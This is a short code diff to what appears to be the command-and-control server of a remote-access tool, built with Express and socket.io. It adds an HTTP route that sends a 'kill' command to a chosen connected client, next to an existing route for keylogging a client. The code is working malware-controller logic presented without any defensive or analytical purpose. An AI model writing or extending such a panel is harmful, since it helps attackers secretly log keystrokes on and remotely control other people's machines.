@@ -99,6 +99,14 @@ app.get('/do/keylog/:socketId', (req, res) => {
 
 })
 
+app.get('/do/kill/:socketId', (req, res) => {
+  
+  let socket = getSocketById(req.params.socketId)
+  if (socket === false) { res.status(400); return }
+  io.to(req.params.socketId).emit('kill')
+
+})
+
 io.on('connection', socket => {
 
   io.to(socket.id).emit('info')
